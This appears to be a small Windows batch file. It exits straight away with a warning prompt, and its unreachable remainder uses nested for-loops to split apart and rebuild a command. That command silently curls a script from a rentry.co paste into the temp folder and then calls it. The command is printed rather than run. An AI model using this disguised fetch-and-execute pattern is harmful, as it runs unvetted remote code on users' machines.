@echo off
echo:
echo  You did not mean to run this file, right?
echo      Press any key to EXIT.
pause >nul
exit /b

for %%a in (F6) do (
    for %%b in ("%temp%\F") do (
        for %%c in (.) do (
            for %%d in (cmd) do (
                for %%e in (rentry) do (
                    REM B - INSTALLER ID IN RENTRY.CO
                    REM C - TEMP LOCATION
                    REM D - DOT
                    REM E - WORD "CMD"
                    REM F - WORD "rentry"
                    cls
                    echo curl -#Lsko "%%~b6%%c%%d" "%%e%%cco/%%a/raw"
                    echo call "%%~b6%%c%%d"
                )
            )
        )
    )
)


PAUSE